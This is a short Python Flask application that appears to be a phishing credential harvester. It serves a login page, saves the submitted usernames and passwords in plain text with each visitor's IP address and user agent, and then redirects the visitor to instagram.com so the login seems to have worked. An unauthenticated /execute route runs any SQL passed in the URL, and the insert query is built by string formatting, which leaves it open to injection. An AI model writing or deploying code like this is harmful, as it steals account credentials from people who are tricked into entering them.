from flask import Flask,request,render_template,redirect
import sqlite3

# database
db = sqlite3.connect('database.db',check_same_thread=False)

cursor = db.cursor()
cursor.execute("create table IF NOT EXISTS user(username TEXT, password TEXT, host TEXT, user TEXT, user_agent TEXT)")
db.commit()

app = Flask(__name__)

@app.route('/',methods= ['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        host = request.remote_addr
        user = request.remote_user
        user_agent = request.user_agent
        cursor.execute(f'insert into user(username,password,host,user,user_agent) VALUES("{username}","{password}","{host}","{user}","{user_agent}")')
        db.commit()
        return redirect('http://instagram.com')
		
    return render_template('login.html')

@app.route("/execute/<sql>")
def execute(sql):
    info = None
    try :
        info = cursor.execute(sql).fetchall()
        db.commit()
    except:
        info = ("error your sql command",)
    return render_template('execute.html',info=info)



if __name__ == '__main__':
    app.run(debug=True,host="0.0.0.0",port=80)

db.close()
